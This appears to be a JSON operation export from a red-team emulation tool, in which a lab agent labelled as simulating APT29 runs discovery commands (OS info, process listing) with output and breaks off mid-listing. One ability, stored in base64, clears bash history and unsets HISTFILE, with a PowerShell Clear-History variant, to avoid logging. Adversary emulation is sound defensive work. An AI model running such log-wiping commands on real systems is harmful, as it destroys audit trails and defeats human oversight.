{"name":"APT29_Simulation","host_group":[{"paw":"maivbp","sleep_min":30,"sleep_max":60,"watchdog":0,"group":"red","architecture":"amd64","platform":"linux","server":"http://192.168.157.131:8888","upstream_dest":"http://192.168.157.131:8888","username":"osboxes","location":"/home/osboxes/sandcat","pid":6839,"ppid":6203,"trusted":true,"executors":["proc","sh"],"privilege":"User","exe_name":"sandcat","host":"osboxes","contact":"HTTP","proxy_receivers":{},"proxy_chain":[],"origin_link_id":"","deadman_enabled":true,"available_contacts":["HTTP"],"host_ip_addrs":["192.168.157.134"],"display_name":"osboxes$osboxes","created":"2026-05-13T22:20:35Z","last_seen":"2026-05-14T10:54:47Z","links":[{"id":"02bb00b4-c469-4463-a2d3-aad781ef2479","paw":"maivbp","command":"PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF","plaintext_command":"PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF","status":0,"score":0,"jitter":0,"decide":"2026-05-13T22:20:35Z","pin":0,"pid":"6852","facts":[],"relationships":[],"used":[],"unique":"02bb00b4-c469-4463-a2d3-aad781ef2479","collect":"2026-05-13T22:20:35Z","finish":"2026-05-13T22:20:35Z","ability":{"ability_id":"43b3754c-def4-4699-a673-1d85648fda6a","tactic":"defense-evasion","technique_name":"Indicator Removal on Host: Clear Command History","technique_id":"T1070.003","name":"Avoid logs","description":"Stop terminal from logging history","executors":[{"name":"sh","platform":"darwin","command":"> $HOME/.bash_history && unset HISTFILE","code":null,"language":null,"build_target":null,"payloads":[],"uploads":[],"timeout":60,"parsers":[],"cleanup":[],"variations":[],"additional_info":{}},{"name":"sh","platform":"linux","command":"> $HOME/.bash_history && unset HISTFILE","code":null,"language":null,"build_target":null,"payloads":[],"uploads":[],"timeout":60,"parsers":[],"cleanup":[],"variations":[],"additional_info":{}},{"name":"psh","platform":"windows","command":"Clear-History;Clear","code":null,"language":null,"build_target":null,"payloads":[],"uploads":[],"timeout":60,"parsers":[],"cleanup":[],"variations":[],"additional_info":{}}],"requirements":[],"privilege":null,"repeatable":false,"buckets":["defense-evasion"],"additional_info":{},"access":{},"singleton":false,"plugin":"stockpile","delete_payload":true},"executor":{"name":"sh","platform":"linux","command":"> $HOME/.bash_history && unset HISTFILE","code":null,"language":null,"build_target":null,"payloads":[],"uploads":[],"timeout":60,"parsers":[],"cleanup":[],"variations":[],"additional_info":{}},"cleanup":0,"visibility":{"score":50,"adjustments":[]},"host":"osboxes","output":"False","deadman":false,"agent_reported_time":"2026-05-13T22:20:34Z"}],"pending_contact":"HTTP","status":"alive"}],"start":"2026-05-14T10:31:03Z","steps":{"maivbp":{"steps":[{"link_id":"ce1058b0-8889-4f64-b4a4-93fdd437bd85","ability_id":"bbccdf00-404a-4b03-8706-bf3f3062bf85","command":"echo \"=== OS INFO ===\"; cat /etc/os-release; echo \"=== KERNEL ===\"; uname -a; echo \"=== HOSTNAME ===\"; hostname; echo \"=== CPU ===\"; lscpu | head -10; echo \"=== MEMORY ===\"; free -h; echo \"=== DISK ===\"; df -h","plaintext_command":"echo \"=== OS INFO ===\"; cat /etc/os-release; echo \"=== KERNEL ===\"; uname -a; echo \"=== HOSTNAME ===\"; hostname; echo \"=== CPU ===\"; lscpu | head -10; echo \"=== MEMORY ===\"; free -h; echo \"=== DISK ===\"; df -h","delegated":"2026-05-14T10:31:04Z","run":"2026-05-14T10:31:33Z","status":0,"platform":"linux","executor":"sh","pid":124036,"description":"","name":"Network Discovery","attack":{"tactic":"discovery","technique_name":"System Network Configuration Discovery","technique_id":"T1016"},"output":{"stdout":"=== OS INFO ===PRETTY_NAME=\"Kali GNU/Linux Rolling\"NAME=\"Kali GNU/Linux\"VERSION_ID=\"2025.2\"VERSION=\"2025.2\"VERSION_CODENAME=kali-rollingID=kaliID_LIKE=debianHOME_URL=\"https://www.kali.org/\"SUPPORT_URL=\"https://forums.kali.org/\"BUG_REPORT_URL=\"https://bugs.kali.org/\"ANSI_COLOR=\"1;31\"=== KERNEL ===Linux osboxes 6.12.25-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.25-1kali1 (2025-04-30) x86_64 GNU/Linux=== HOSTNAME ===osboxes=== CPU ===Architecture:                         x86_64CPU op-mode(s):                       32-bit, 64-bitAddress sizes:                        45 bits physical, 48 bits virtualByte Order:                           Little EndianCPU(s):                               2On-line CPU(s) list:                  0,1Vendor ID:                            GenuineIntelModel name:                           Intel(R) Core(TM) i7-8565U CPU @ 1.80GHzCPU family:                           6Model:                                142=== MEMORY ===               total        used        free      shared  buff/cache   availableMem:           1.9Gi       1.2Gi       163Mi        62Mi       735Mi       664MiSwap:          953Mi       9.3Mi       944Mi=== DISK ===Filesystem      Size  Used Avail Use% Mounted onudev            902M     0  902M   0% /devtmpfs           194M  1.2M  193M   1% /run/dev/sda1       492G   15G  456G   4% /tmpfs           968M  4.0K  968M   1% /dev/shmtmpfs           5.0M     0  5.0M   0% /run/locktmpfs           1.0M     0  1.0M   0% /run/credentials/systemd-journald.servicetmpfs           968M  252K  968M   1% /tmptmpfs           1.0M     0  1.0M   0% /run/credentials/getty@tty1.servicetmpfs           194M  128K  194M   1% /run/user/1001","stderr":"","exit_code":"0"},"agent_reported_time":"2026-05-14T10:31:32Z"},{"link_id":"b66b5338-4f82-4cb1-b916-af9c39be63f5","ability_id":"e28955de-dcaf-4fdd-8bc5-9ac4e86ec65e","command":"ps aux","plaintext_command":"ps aux","delegated":"2026-05-14T10:31:34Z","run":"2026-05-14T10:32:31Z","status":0,"platform":"linux","executor":"sh","pid":124510,"description":"","name":"Process Discovery","attack":{"tactic":"discovery","technique_name":"Process Discovery","technique_id":"T1057"},"output":{"stdout":"USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMANDroot           1  0.0  0.7  23504 14384 ?        Ss   02:22   0:01 /sbin/init splashroot           2  0.0  0.0      0     0 ?        S    02:22   0:00 [kthreadd]root           3  0.0  0.0      0     0 ?        S    02:22   0:00 [pool_workqueue_release]root           4  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-kvfree_rcu_reclaim]root           5  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-rcu_gp]root           6  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-sync_wq]root           7  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-slub_flushwq]root           8  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-netns]root          11  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/0:0H-events_highpri]root          12  0.0  0.0      0     0 ?        I    02:22   0:00 [kworker/u512:0-ipv6_addrconf]root          13  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-mm_percpu_wq]root          14  0.0  0.0      0     0 ?        I    02:22   0:00 [rcu_tasks_kthread]root          15  0.0  0.0      0     0 ?        I    02:22   0:00 [rcu_tasks_rude_kthread]root          16  0.0  0.0      0     0 ?        I    02:22   0:00 [rcu_tasks_trace_kthread]root          17  0.0  0.0      0     0 ?        S    02:22   0:01 [ksoftirqd/0]root          18  0.0  0.0      0     0 ?        I    02:22   0:03 [rcu_preempt]root          19  0.0  0.0      0     0 ?        S    02:22   0:00 [rcu_exp_par_gp_kthread_worker/1]root          20  0.0  0.0      0     0 ?        S    02:22   0:00 [rcu_exp_gp_kthread_worker]root          21  0.0  0.0      0     0 ?        S    02:22   0:00 [migration/0]root          22  0.0  0.0      0     0 ?        S    02:22   0:00 [idle_inject/0]root          23  0.0  0.0      0     0 ?        S    02:22   0:00 [cpuhp/0]root          24  0.0  0.0      0     0 ?        S    02:22   0:00 [cpuhp/1]root          25  0.0  0.0      0     0 ?        S    02:22   0:00 [idle_inject/1]root          26  0.0  0.0      0     0 ?        S    02:22   0:00 [migration/1]root          27  0.0  0.0      0     0 ?        S    02:22   0:01 [ksoftirqd/1]root          34  0.0  0.0      0     0 ?        S    02:22   0:00 [kdevtmpfs]root          35  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-inet_frag_wq]root          36  0.0  0.0      0     0 ?        S    02:22   0:00 [kauditd]root          37  0.0  0.0      0     0 ?        S    02:22   0:00 [khungtaskd]root          39  0.0  0.0      0     0 ?        S    02:22   0:00 [oom_reaper]root          41  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-writeback]root          42  0.0  0.0      0     0 ?        S    02:22   0:04 [kcompactd0]root          43  0.0  0.0      0     0 ?        SN   02:22   0:00 [ksmd]root          44  0.0  0.0      0     0 ?        SN   02:22   0:00 [khugepaged]root          45  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-kintegrityd]root          46  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-kblockd]root          47  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-blkcg_punt_bio]root          48  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/9-acpi]root          50  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-tpm_dev_wq]root          51  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-edac-poller]root          52  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-devfreq_wq]root          53  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/1:1H-kblockd]root          54  0.0  0.0      0     0 ?        S    02:22   0:01 [kswapd0]root          62  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-kthrotld]root          66  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/24-pciehp]root          67  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/25-pciehp]root          68  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/26-pciehp]root          69  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/27-pciehp]root          70  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/28-pciehp]root          71  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/29-pciehp]root          72  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/30-pciehp]root          73  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/31-pciehp]root          74  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/32-pciehp]root          75  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/33-pciehp]root          76  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/34-pciehp]root          77  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/35-pciehp]root          78  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/36-pciehp]root          79  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/37-pciehp]root          80  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/38-pciehp]root          81  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/39-pciehp]root          82  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/40-pciehp]root          83  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/41-pciehp]root          84  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/42-pciehp]root          85  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/43-pciehp]root          86  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/44-pciehp]root          87  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/45-pciehp]root          88  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/46-pciehp]root          89  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/47-pciehp]root          90  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/48-pciehp]root          91  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/49-pciehp]root          92  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/50-pciehp]root          93  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/51-pciehp]root          94  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/52-pciehp]root          95  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/53-pciehp]root          96  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/54-pciehp]root          97  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/55-pciehp]root          98  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-acpi_thermal_pm]root         100  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-mld]root         102  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-ipv6_addrconf]root         104  0.0  0.0      0     0 ?        I    02:22   0:00 [kworker/u512:1-ipv6_addrconf]root         108  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-kstrp]root         112  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/u515:0]root         114  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/u517:0-ttm]root         227  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-cryptd]root         232  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-ata_sff]root         268  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-mpt_poll_0]root         272  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-mpt/0]root         276  0.0  0.0      0     0 ?        S    02:22   0:00 [scsi_eh_0]root         277  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-scsi_tmf_0]root         278  0.0  0.0      0     0 ?        S    02:22   0:00 [scsi_eh_1]root         279  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-scsi_tmf_1]root         284  0.0  0.0      0     0 ?        S    02:22   0:00 [scsi_eh_2]root         285  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-scsi_tmf_2]root         286  0.0  0.0      0     0 ?        S    02:22   0:00 [scsi_eh_3]root         287  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-scsi_tmf_3]root         288  0.0  0.0      0     0 ?        S    02:22   0:00 [scsi_eh_4]root         289  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-scsi_tmf_4]root         290  0.0  0.0      0     0 ?        S    02:22   0:00 [scsi_eh_5]root         291  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-scsi_tmf_5]root         292  0.0  0.0      0     0 ?        S    02:22   0:00 [scsi_eh_6]root         293  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-scsi_tmf_6]root         294  0.0  0.0      0     0 ?        S    02:22   0:00 [scsi_eh_7]root         295  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-scsi_tmf_7]root         296  0.0  0.0      0     0 ?        S    02:22   0:00 [scsi_eh_8]root         297  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-scsi_tmf_8]root         298  0.0  0.0      0     0 ?        S    02:22   0:00 [scsi_eh_9]root         299  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-scsi_tmf_9]root         300  0.0  0.0      0     0 ?        S    02:22   0:00 [scsi_eh_10]root         301  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-scsi_tmf_10]root         302  0.0  0.0      0     0 ?        S    02:22   0:00 [scsi_eh_11]root         303  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-scsi_tmf_11]root         304  0.0  0.0      0     0 ?        S    02:22   0:00 [scsi_eh_12]root         305  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-scsi_tmf_12]root         306  0.0  0.0      0     0 ?        S    02:22   0:00 [scsi_eh_13]root         307  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-scsi_tmf_13]root         308  0.0  0.0      0     0 ?        S    02:22   0:00 [scsi_eh_14]root         309  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-scsi_tmf_14]root         310  0.0  0.0      0     0 ?        S    02:22   0:00 [scsi_eh_15]root         311  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-scsi_tmf_15]root         312  0.0  0.0      0     0 ?        S    02:22   0:00 [scsi_eh_16]root         313  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-scsi_tmf_16]root         314  0.0  0.0      0     0 ?        S    02:22   0:00 [scsi_eh_17]root         315  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-scsi_tmf_17]root         316  0.0  0.0      0     0 ?        S    02:22   0:00 [scsi_eh_18]root         317  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-scsi_tmf_18]root         318  0.0  0.0      0     0 ?        S    02:22   0:00 [scsi_eh_19]root         319  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-scsi_tmf_19]root         320  0.0  0.0      0     0 ?        S    02:22   0:00 [scsi_eh_20]root         321  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-scsi_tmf_20]root         322  0.0  0.0      0     0 ?        S    02:22   0:00 [scsi_eh_21]root         323  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-scsi_tmf_21]root         324  0.0  0.0      0     0 ?        S    02:22   0:00 [scsi_eh_22]root         325  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-scsi_tmf_22]root         326  0.0  0.0      0     0 ?        S    02:22   0:00 [scsi_eh_23]root         327  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-scsi_tmf_23]root         328  0.0  0.0      0     0 ?        S    02:22   0:00 [scsi_eh_24]root         329  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-scsi_tmf_24]root         330  0.0  0.0      0     0 ?        S    02:22   0:00 [scsi_eh_25]root         331  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-scsi_tmf_25]root         332  0.0  0.0      0     0 ?        S    02:22   0:00 [scsi_eh_26]root         333  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-scsi_tmf_26]root         334  0.0  0.0      0     0 ?        S    02:22   0:00 [scsi_eh_27]root         335  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-scsi_tmf_27]root         336  0.0  0.0      0     0 ?        S    02:22   0:00 [scsi_eh_28]root         337  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-scsi_tmf_28]root         338  0.0  0.0      0     0 ?        S    02:22   0:00 [scsi_eh_29]root         339  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-scsi_tmf_29]root         340  0.0  0.0      0     0 ?        S    02:22   0:00 [scsi_eh_30]root         341  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-scsi_tmf_30]root         342  0.0  0.0      0     0 ?        S    02:22   0:00 [scsi_eh_31]root         343  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-scsi_tmf_31]root         371  0.0  0.0      0     0 ?        S    02:22   0:00 [scsi_eh_32]root         372  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-scsi_tmf_32]root         395  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/16-vmwgfx]root         396  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-ttm]root         400  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/1:2H-kblockd]root         431  0.0  0.0      0     0 ?        S    02:22   0:00 [jbd2/sda1-8]root         432  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-ext4-rsv-conversion]root         480  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/57-vmw_vmci]root         481  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/58-vmw_vmci]root         482  0.0  0.0      0     0 ?        S    02:22   0:00 [irq/59-vmw_vmci]root         496  0.0  0.9  51132 17972 ?        Ss   02:22   0:00 /usr/lib/systemd/systemd-journaldsystemd+     519  0.0  0.4 165608  8104 ?        Ssl  02:22   0:00 /usr/lib/systemd/systemd-timesyncdroot         523  0.0  0.0 158632  1520 ?        Ssl  02:22   0:00 vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suidroot         562  0.0  0.5  37464 11828 ?        Ss   02:22   0:00 /usr/lib/systemd/systemd-udevdroot         631  0.0  0.0      0     0 ?        S    02:22   0:00 [psimon]root         635  0.0  0.2   8380  5380 ?        Ss   02:22   0:00 /usr/sbin/haveged --Foreground --verbose=1root         649  0.1  0.5 253140  9988 ?        Ssl  02:22   0:16 /usr/bin/vmtoolsdroot         806  0.0  0.3 309880  7928 ?        Ssl  02:22   0:00 /usr/libexec/accounts-daemonmessage+     807  0.0  0.3  10228  7148 ?        Ss   02:22   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-onlypolkitd      811  0.0  0.5 382568 10184 ?        Ssl  02:22   0:00 /usr/lib/polkit-1/polkitd --no-debug --log-level=noticeroot         819  0.0  0.4  18988  9036 ?        Ss   02:22   0:00 /usr/lib/systemd/systemd-logindroot         858  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-rpciod]root         859  0.0  0.0      0     0 ?        I<   02:22   0:00 [kworker/R-xprtiod]root         876  0.0  0.1   6864  2856 ?        Ss   02:22   0:00 /usr/sbin/cron -froot         885  0.0  0.9 336376 19064 ?        Ssl  02:22   0:00 /usr/sbin/NetworkManager --no-daemonroot         944  0.0  0.6 390912 12112 ?        Ssl  02:22   0:00 /usr/sbin/ModemManagerroot        1025  0.0  0.3 380868  7236 ?        SLsl 02:22   0:00 /usr/sbin/lightdmroot        1052  0.2  7.1 421228 141164 tty7    Ssl+ 02:22   0:43 /usr/lib/xorg/Xorg :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitchroot        1054  0.0  0.1   8160  2600 tty1     Ss+  02:22   0:00 /sbin/agetty -o -- \\u --noreset --noclear - linuxroot        1132  0.0  0.0      0     0 ?        S    02:22   0:00 [psimon]rtkit       1163  0.0  0.1  21472  2948 ?        SNsl 02:22   0:00 /usr/libexec/rtkit-daemonroot        1237  0.0  0.4 172760  9628 ?        Sl   02:23   0:00 lightdm --session-child 13 24osboxes     1248  0.0  0.6  22840 12668 ?        Ss   02:23   0:00 /usr/lib/systemd/systemd --userosboxes     1250  0.0  0.1  25036  3672 ?        S    02:23   0:00 (sd-pam)osboxes     1270  0.0  0.2   9156  5176 ?        Ss   02:23   0:00 /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-onlyosboxes     1271  0.0  0.4 110680  8160 ?        S<sl 02:23   0:00 /usr/bin/pipewireosboxes     1272  0.0  0.1  84744  3688 ?        Ssl  02:23   0:00 /usr/bin/pipewire -c filter-chain.confosboxes     1274  0.0  1.0 613112 20084 ?        S<sl 02:23   0:00 /usr/bin/wireplumberosboxes     1275  0.0  0.3  99320  6580 ?        S<sl 02:23   0:00 /usr/bin/pipewire-pulseosboxes     1276  0.0  0.4 183140  8860 ?        SLsl 02:23   0:00 /usr/bin/gnome-keyring-daemon --foreground --components=pkcs11,secrets --control-directory=/run/user/1001/keyringosboxes     1277  0.0  0.1   7224  3520 ?        Ss   02:23   0:00 /usr/bin/mpris-proxyosboxes     1297  0.0  1.5 347956 31188 ?        Ssl  02:23   0:00 xfce4-sessionosboxes     1366  0.0  0.3 381164  7060 ?        Ssl  02:23   0:00 /usr/libexec/at-spi-bus-launcherosboxes     1373  0.0  0.2   8736  4896 ?        S    02:23   0:00 /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 11 --address=unix:path=/run/user/1001/at-spi/bus_0osboxes     1383  0.0  0.3 168744  7416 ?        Sl   02:23   0:00 /usr/libexec/at-spi2-registryd --use-gnome-sessionosboxes     1391  0.0  0.0  10928  1804 ?        Ss   02:23   0:00 /usr/bin/ssh-agent -sosboxes     1400  0.0  0.1 155452  3152 ?        SLsl 02:23   0:00 /usr/bin/gpg-agent --supervisedosboxes     1403  0.1  5.6 887916 112756 ?       Sl   02:23   0:26 xfwm4osboxes     1407  0.0  0.3 312636  7108 ?        Ssl  02:23   0:00 /usr/libexec/gvfsdosboxes     1413  0.0  0.3 472100  7124 ?        Sl   02:23   0:00 /usr/libexec/gvfsd-fuse /run/user/1001/gvfs -fosboxes     1430  0.0  1.1 275384 22564 ?        Sl   02:23   0:00 xfsettingsdosboxes     1435  0.0  0.2 165228  5488 ?        Ssl  02:23   0:00 /usr/libexec/dconf-serviceosboxes     1436  0.0  1.9 441128 38616 ?        Sl   02:23   0:00 xfce4-panelosboxes     1444  0.0  1.0 411540 20520 ?        Sl   02:23   0:00 Thunar --daemonosboxes     1450  0.0  4.2 533608 83716 ?        Sl   02:23   0:02 xfdesktoposboxes     1451  0.0  1.8 502332 36712 ?        Sl   02:23   0:00 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libwhiskermenu.so 1 16777223 whiskermenu Whisker Menu Show a menu to easily access installed applicationsosboxes     1458  0.2  2.1 222208 42728 ?        Sl   02:23   0:30 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libcpugraph.so 13 16777228 cpugraph CPU Graph Graphical representation of the CPU loadosboxes     1459  0.0  1.0 411560 21360 ?        Sl   02:23   0:00 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libsystray.so 14 16777229 systray Status Tray Plugin Provides status notifier items (application indicators) and legacy systray itemsosboxes     1460  0.1  1.2 274012 24032 ?        Sl   02:23   0:19 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libgenmon.so 15 16777230 genmon Generic Monitor Show output of a command.osboxes     1461  0.0  1.6 359412 33164 ?        Sl   02:23   0:00 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libpulseaudio-plugin.so 16 16777231 pulseaudio PulseAudio Plugin Adjust the audio volume of the PulseAudio sound systemosboxes     1462  0.0  1.6 425612 32664 ?        Sl   02:23   0:00 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libnotification-plugin.so 17 16777232 notification-plugin Notification Plugin Notification plugin for the Xfce panelosboxes     1463  0.0  1.6 286488 32940 ?        Sl   02:23   0:00 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libxfce4powermanager.so 18 16777233 power-manager-plugin Power Manager Plugin Display the battery levels of your devices and control the brightness of your displayosboxes     1465  0.0  1.6 425892 33136 ?        Sl   02:23   0:00 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libactions.so 22 16777234 actions Action Buttons Log out, lock or other system actionsroot        1505  0.0  0.5 318680 10060 ?        Ssl  02:23   0:00 /usr/libexec/upowerdosboxes     1510  0.0  1.7 361368 34948 ?        Ssl  02:23   0:00 /usr/lib/x86_64-linux-gnu/xfce4/notifyd/xfce4-notifydosboxes     1523  0.0  1.8 587080 37200 ?        Sl   02:23   0:00 nm-appletosboxes     1524  0.0  1.7  64928 34560 ?        S    02:23   0:00 /usr/bin/python3 /usr/share/system-config-printer/applet.pyosboxes     1532  0.0  0.0  12424  1740 ?        Ssl  02:23   0:00 xcape -e Super_L Control_L Escapeosboxes     1536  0.0  1.6 209460 33060 ?        Sl   02:23   0:00 xfce4-screensaverosboxes     1537  0.0  0.6 191036 13320 ?        Sl   02:23   0:00 /usr/libexec/polkit-mate-authentication-agent-1osboxes     1538  0.0  0.3 308516  6680 ?        Sl   02:23   0:00 /usr/libexec/geoclue-2.0/demos/agentosboxes     1548  0.0  2.4 529168 49204 ?        Sl   02:23   0:00 /usr/bin/python3 /usr/bin/blueman-appletosboxes     1549  0.0  0.4 791532  8480 ?        Sl   02:23   0:00 xiccdosboxes     1552  0.1  1.4 148644 29084 ?        Sl   02:23   0:16 /usr/bin/vmtoolsd -n vmusr --blockFd 3osboxes     1553  0.0  0.7 331348 14248 ?        Sl   02:23   0:00 xfce4-power-managercolord      1577  0.0  0.6 315948 12768 ?        Ssl  02:23   0:00 /usr/libexec/colordosboxes     1698  0.0  0.5 391004 10544 ?        Ssl  02:23   0:00 /usr/libexec/gvfs-udisks2-volume-monitorroot        1702  0.0  0.6 404412 12620 ?        Ssl  02:23   0:00 /usr/libexec/udisks2/udisksdosboxes     1711  0.0  0.3 307928  6424 ?        Ssl  02:23   0:00 /usr/libexec/gvfs-mtp-volume-monitorosboxes     1716  0.0  0.3 308880  6568 ?        Ssl  02:23   0:00 /usr/libexec/gvfs-gphoto2-volume-monitorosboxes     1723  0.0  0.4 390016  8488 ?        Ssl  02:23   0:00 /usr/libexec/gvfs-afc-volume-monitorosboxes     1730  0.0  0.3 307824  6004 ?        Ssl  02:23   0:00 /usr/libexec/gvfs-goa-volume-monitorosboxes     1741  0.0  0.3 168876  6112 ?        Ssl  02:23   0:00 /usr/libexec/gvfsd-metadataosboxes     1745  0.0  0.4 534076  8408 ?        Sl   02:23   0:00 /usr/libexec/gvfsd-trash --spawner :1.24 /org/gtk/gvfs/exec_spaw/0osboxes     1748  0.0  0.8 378696 17352 ?        Ssl  02:23   0:00 /usr/libexec/bluetooth/obexdosboxes     1820  0.2 20.0 3008208 397196 ?      Sl   02:23   0:33 /usr/lib/firefox-esr/firefox-esrosboxes     1908  0.0  2.0 214788 41096 ?        Sl   02:23   0:00 /usr/lib/firefox-esr/firefox-esr -contentproc -parentBuildID 20250517152055 -prefsLen 28091 -prefMapSize 249178 -appDir /usr/lib/firefox-esr/browser {1ad3d668-eddd-4b7b-a083-d5b1ee6b2003} 1820 true socketosboxes     1911  0.0  0.8 556892 17588 ?        Ssl  02:23   0:00 /usr/libexec/xdg-desktop-portalosboxes     1921  0.0  0.3 308736  6372 ?        Ssl  02:23   0:00 